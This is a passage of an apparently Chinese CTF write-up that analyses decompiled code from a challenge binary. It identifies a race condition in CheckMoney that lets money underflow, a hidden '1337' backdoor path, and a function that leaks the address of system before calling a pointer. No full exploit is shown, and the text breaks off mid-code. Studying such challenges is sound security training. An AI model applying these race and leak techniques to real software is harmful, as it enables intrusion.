+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v13 = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">base::internal::BindStateBase::BindStateBase(</span><br><span class="line">  v13,</span><br><span class="line">  base::internal::Invoker&lt;base::internal::FunctorTraits&lt;void (*&amp;&amp;)(<span class="type">int</span>),<span class="type">int</span> &amp;&amp;&gt;,base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(<span class="type">int</span>),<span class="type">int</span>&gt;,void ()(void)&gt;::RunOnce,</span><br><span class="line">  base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;::Destroy);</span><br><span class="line">*(_QWORD *)(v13 + <span class="number">0x20</span>) = RapidAdvance::PickHandle;</span><br><span class="line">*(_DWORD *)(v13 + <span class="number">0x28</span>) = v18[<span class="number">0</span>];</span><br><span class="line">base::TaskRunner::PostTask(v12, v17, v13);</span><br><span class="line">v14 = g_main_thread_task_runner;</span><br><span class="line">base::Location::Current(</span><br><span class="line">  (base::Location *)v17,</span><br><span class="line">  <span class="string">&quot;RapidAdvanceMenu&quot;</span>,</span><br><span class="line">  <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>,</span><br><span class="line">  <span class="number">110</span>);</span><br><span class="line">v15 = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">base::internal::BindStateBase::BindStateBase(</span><br><span class="line">  v15,</span><br><span class="line">  base::internal::Invoker&lt;base::internal::FunctorTraits&lt;void (*&amp;&amp;)(void)&gt;,base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;,void ()(void)&gt;::RunOnce,</span><br><span class="line">  base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;::Destroy);</span><br><span class="line">*(_QWORD *)(v15 + <span class="number">32</span>) = Repeat;</span><br><span class="line"><span class="keyword">return</span> base::TaskRunner::PostTask(v14, v17, v15);</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来进入RapidAdvance::PickHandle()函数，输入 1 后，CheckMoney的返回值不等于 0 会调用 RapidAdvance::StartRA()。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall RapidAdvance::PickHandle(RapidAdvance *this)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  v17[<span class="number">0</span>] = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)this == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    [...]</span><br><span class="line">	v9 = (Player *)&amp;g_player;</span><br><span class="line">    v10 = <span class="number">10000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)this != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)this == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (Player *)&amp;g_player;</span><br><span class="line">        result = Player::CheckMoney(v5, <span class="number">0x64</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">          <span class="keyword">return</span> RapidAdvance::StartRA((RapidAdvance *)((char *)&amp;qword_60 + <span class="number">4</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">      [...]</span><br><span class="line">      v9 = (Player *)&amp;g_player;</span><br><span class="line">      v10 = <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = Player::CheckMoney(v9, v10);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = std::__Cr::__put_character_sequence&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;(</span><br><span class="line">            &amp;std::__Cr::cout,</span><br><span class="line">            <span class="string">&quot;You finish the game. Hope your next visit.&quot;</span>,</span><br><span class="line">            <span class="number">42</span>LL);</span><br><span class="line">	[...]</span><br><span class="line">    <span class="keyword">return</span> std::__Cr::basic_ostream&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;::flush(v14);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>StartRA</strong></p>
+<p>通过PostTask启动FiveStar，</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall RapidAdvance::StartRA(RapidAdvance *this)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)this == <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = g_main_thread_task_runner;</span><br><span class="line">    base::Location::Current((base::Location *)v7, <span class="string">&quot;StartRA&quot;</span>, <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>, <span class="number">276</span>);</span><br><span class="line">    v2 = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    base::internal::BindStateBase::BindStateBase(</span><br><span class="line">      v2,</span><br><span class="line">      base::internal::Invoker&lt;base::internal::FunctorTraits&lt;void (*&amp;&amp;)(void)&gt;,base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;,void ()(void)&gt;::RunOnce,</span><br><span class="line">      base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;::Destroy);</span><br><span class="line">    *(_QWORD *)(v2 + <span class="number">0x20</span>) = FiveStar;</span><br><span class="line">    base::TaskRunner::PostTask(v1, v7, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = std::__Cr::__put_character_sequence&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;(</span><br><span class="line">         &amp;std::__Cr::cout,</span><br><span class="line">         <span class="string">&quot;You finish the game. Hope your next visit.&quot;</span>,</span><br><span class="line">         <span class="number">42</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>进入FiveStart后，调试时发现其进入的时 v12&lt;0 这个分支，将src[0]的内容复制给v7+0x28指向的地方。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 FiveStar(void)</span><br><span class="line">&#123;</span><br><span class="line">  *(_OWORD *)src = <span class="number">0</span>LL;</span><br><span class="line">  v12 = <span class="number">0</span>LL;</span><br><span class="line">  std::__Cr::operator&gt;&gt;&lt;char,std::__Cr::char_traits&lt;char&gt;,std::__Cr::allocator&lt;char&gt;&gt;(&amp;std::__Cr::cin, src);</span><br><span class="line">  [...]</span><br><span class="line">  v6 = g_io_thread_task_runner;</span><br><span class="line">  base::Location::Current((base::Location *)v10, <span class="string">&quot;FiveStar&quot;</span>, <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>, <span class="number">270</span>);</span><br><span class="line">  v7 = operator <span class="built_in">new</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  [...]</span><br><span class="line">  *(_QWORD *)(v7 + <span class="number">0x20</span>) = NoteStar;</span><br><span class="line">  v8 = (_OWORD *)(v7 + <span class="number">0x28</span>);                   <span class="comment">// v8-&gt;v7+0x28</span></span><br><span class="line">  <span class="keyword">if</span> ( v12 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">std::__Cr::basic_string&lt;char,std::__Cr::char_traits&lt;char&gt;,std::__Cr::allocator&lt;char&gt;&gt;::__init_copy_ctor_external(</span><br><span class="line">      v8,</span><br><span class="line">      src[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(v7 + <span class="number">0x38</span>) = v12;</span><br><span class="line">    *v8 = *(_OWORD *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  result = base::TaskRunner::PostTask(v6, v10, v7);</span><br><span class="line">  <span class="keyword">if</span> ( v12 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> free(src[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>CheckMoney</strong></p>
+<p>CheckMoney 调用了 sleep(1) 存在窗口时间，并且可以看到堆 money 的操作也并不是原子的，此时上面令起的Repeat任务早已开始运行了，我们此时可以利用这个等待时间购买其他东西，导致money整数溢出。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall Player::CheckMoney(Player *this, unsigned <span class="type">int</span> cost)</span><br><span class="line">&#123;</span><br><span class="line">  v2 = (__int128 *)g_player;</span><br><span class="line">  v3 = *((_DWORD *)v2 + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= cost )</span><br><span class="line">  &#123;</span><br><span class="line">    [...]</span><br><span class="line">    sleep(<span class="number">1</span>u); <span class="comment">// 窗口时间，并且此时未更改money值</span></span><br><span class="line">    v8 = (__int128 *)g_player;</span><br><span class="line">	[...]</span><br><span class="line">    v12 = *((_DWORD *)v8 + <span class="number">6</span>) - cost;</span><br><span class="line">    v13 = (__int128 *)g_player;</span><br><span class="line">    *((_DWORD *)v13 + <span class="number">6</span>) = v12;</span><br><span class="line">    v14 = (__int128 *)g_player;</span><br><span class="line">    v15 = std::__Cr::basic_string&lt;char,std::__Cr::char_traits&lt;char&gt;,std::__Cr::allocator&lt;char&gt;&gt;::insert(</span><br><span class="line">            v22,</span><br><span class="line">            <span class="number">0</span>LL,</span><br><span class="line">            <span class="string">&quot;\n[!] OK, now you money is : &quot;</span>,</span><br><span class="line">            <span class="number">28</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v25 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      free(v24);</span><br><span class="line">      <span class="keyword">if</span> ( v23 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> v3 &gt;= cost;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v23 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> v3 &gt;= cost;</span><br><span class="line">    &#125;</span><br><span class="line">    free(v22[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> v3 &gt;= cost;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = std::__Cr::__put_character_sequence&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;(</span><br><span class="line">         &amp;std::__Cr::cout,</span><br><span class="line">         <span class="string">&quot;Don&#x27;t have e enough money.&quot;</span>,</span><br><span class="line">         <span class="number">26</span>LL);</span><br><span class="line">  <span class="keyword">return</span> v3 &gt;= cost;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MagicCastleMenu</strong></p>
+<p>调用 MagicCastle::SwitchHandle(v16) 处理选择，然后令起任务MainStmt。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 MagicCastleMenu(void)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  LODWORD(v16) = <span class="number">-1431655766</span>;</span><br><span class="line">  std::__Cr::basic_istream&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;::operator&gt;&gt;(&amp;std::__Cr::cin, &amp;v16);</span><br><span class="line">  [...]</span><br><span class="line">  MagicCastle::SwitchHandle((MagicCastle *)(unsigned <span class="type">int</span>)v16);</span><br><span class="line">  v12 = g_main_thread_task_runner;</span><br><span class="line">  base::Location::Current((base::Location *)v15, <span class="string">&quot;Repeat&quot;</span>, <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>, <span class="number">134</span>);</span><br><span class="line">  v13 = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  base::internal::BindStateBase::BindStateBase(</span><br><span class="line">    v13,</span><br><span class="line">    base::internal::Invoker&lt;base::internal::FunctorTraits&lt;void (*&amp;&amp;)(void)&gt;,base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;,void ()(void)&gt;::RunOnce,</span><br><span class="line">    base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;::Destroy);</span><br><span class="line">  *(_QWORD *)(v13 + <span class="number">0x20</span>) = MainStmt;</span><br><span class="line">  <span class="keyword">return</span> base::TaskRunner::PostTask(v12, v15, v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MagicCastle::SwitchHandle</strong></p>
+<p>可以看到一个隐藏后门 输入1337后，如果<code>*(_BYTE *)(g_player + 0x1CLL) == 7</code>会进入MagicHeld::Gods函数。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall MagicCastle::SwitchHandle(MagicCastle *this)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)this &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)this == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_magiccastle &lt;= <span class="number">1</span>uLL )</span><br><span class="line">      &#123;</span><br><span class="line">        this = (MagicCastle *)&amp;g_magiccastle;</span><br><span class="line">        <span class="keyword">if</span> ( (unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&amp;g_magiccastle) )</span><br><span class="line">        &#123;</span><br><span class="line">          this = (MagicCastle *)&amp;g_magiccastle;</span><br><span class="line">          base::internal::CompleteLazyInstance(&amp;g_magiccastle, &amp;unk_145068, <span class="number">0</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      MagicCastle::BuyMS(this);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)this == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_magiccastle &lt;= <span class="number">1</span>uLL )</span><br><span class="line">      &#123;</span><br><span class="line">        this = (MagicCastle *)&amp;g_magiccastle;</span><br><span class="line">        <span class="keyword">if</span> ( (unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&amp;g_magiccastle) )</span><br><span class="line">        &#123;</span><br><span class="line">          this = (MagicCastle *)&amp;g_magiccastle;</span><br><span class="line">          base::internal::CompleteLazyInstance(&amp;g_magiccastle, &amp;unk_145068, <span class="number">0</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      MagicCastle::DropMS(this);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)this != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)this != <span class="number">1337</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    v1 = (__int128 *)g_player;</span><br><span class="line">    [...]</span><br><span class="line">    v18[<span class="number">0</span>] = *((_BYTE *)v1 + <span class="number">0x1C</span>);</span><br><span class="line">    [...]</span><br><span class="line">    v6 = (__int128 *)g_player;</span><br><span class="line">    <span class="keyword">if</span> ( g_player &lt;= <span class="number">1</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&amp;g_player) )</span><br><span class="line">      &#123;</span><br><span class="line">		[...]</span><br><span class="line">        <span class="keyword">if</span> ( (unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&amp;g_player) )</span><br><span class="line">        &#123;</span><br><span class="line">          [...]</span><br><span class="line">LABEL_31:</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)v7 + <span class="number">0x1C</span>) == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_32:   <span class="comment">// 根据提示来看，这里也存在条件竞争。</span></span><br><span class="line">            v8 = std::__Cr::__put_character_sequence&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;(</span><br><span class="line">                   &amp;std::__Cr::cout,</span><br><span class="line">                   <span class="string">&quot;\x1B[31m [!] The system is currently recording you name, Please wait 5s... \x1B[0m&quot;</span>,</span><br><span class="line">                   <span class="number">76</span>LL);</span><br><span class="line">            v11 = (void (__fastcall ***)(_QWORD, char *, _QWORD *, __int64))g_io_thread_task_runner;</span><br><span class="line">            [...]</span><br><span class="line">            v12 = (__int128 *)g_player;</span><br><span class="line">            [...]</span><br><span class="line">            v16 = *((_QWORD *)v12 + <span class="number">4</span>); <span class="comment">// magic_cast</span></span><br><span class="line">            [...]</span><br><span class="line">            v17 = (_QWORD *)operator <span class="built_in">new</span>(<span class="number">0x38</span>uLL);</span><br><span class="line">            [...]</span><br><span class="line">            v17[<span class="number">4</span>] = MagicHeld::Gods;</span><br><span class="line">            v17[<span class="number">5</span>] = <span class="number">0</span>LL;</span><br><span class="line">            v17[<span class="number">6</span>] = v16;</span><br><span class="line">            (**v11)(v11, v18, v17, <span class="number">3000000</span>LL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(g_player + <span class="number">0x1C</span>LL) == <span class="number">7</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_32; <span class="comment">// 如果条件成立进入调用Gods</span></span><br><span class="line">LABEL_41:</span><br><span class="line">        v13 = std::__Cr::__put_character_sequence&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;(</span><br><span class="line">                &amp;std::__Cr::cout,</span><br><span class="line">                <span class="string">&quot;You are not qualified!&quot;</span>,</span><br><span class="line">                <span class="number">22</span>LL);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">[...]</span><br><span class="line">LABEL_19:</span><br><span class="line">  <span class="keyword">if</span> ( g_magiccastle &lt;= <span class="number">1</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    this = (MagicCastle *)&amp;g_magiccastle;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&amp;g_magiccastle) )</span><br><span class="line">    &#123;</span><br><span class="line">      this = (MagicCastle *)&amp;g_magiccastle;</span><br><span class="line">      base::internal::CompleteLazyInstance(&amp;g_magiccastle, &amp;unk_145068, <span class="number">0</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  MagicCastle::LearningMS(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MagicHeld::Gods</strong></p>
+<p>根据上面的参数传递来看，参数this &#x3D; v17[6] &#x3D; v16 &#x3D; *((_QWORD *)v12 + 4); &#x2F;&#x2F; magic_cast;，根据提示，这里也存在条件竞争。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall MagicHeld::Gods(<span class="keyword">const</span> void **this)</span><br><span class="line">&#123;</span><br><span class="line">  printf(<span class="string">&quot;%p\n&quot;</span>, &amp;system);</span><br><span class="line">  printf(<span class="string">&quot;%p\n&quot;</span>, this[<span class="number">5</span>]);</span><br><span class="line">  v1 = (__int64 (__fastcall *)(__int128 *))this[<span class="number">5</span>];</span><br><span class="line">  v2 = (__int128 *)g_player;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> ( *((char *)v2 + <span class="number">0x17</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">    v5 = *((_QWORD *)v2 + <span class="number">2</span>);</span><br><span class="line">    dest = *v2;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">  std::__Cr::basic_string&lt;char,std::__Cr::char_traits&lt;char&gt;,std::__Cr::allocator&lt;char&gt;&gt;::__init_copy_ctor_external(</span><br><span class="line">    &amp;dest,</span><br><span class="line">    *(void **)v2);</span><br><span class="line">LABEL_8:</span><br><span class="line">  result = v1(&amp;dest);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> free(dest);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MagicCastle::BuyMS(this)</strong></p>
+<p>有三个选项，</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 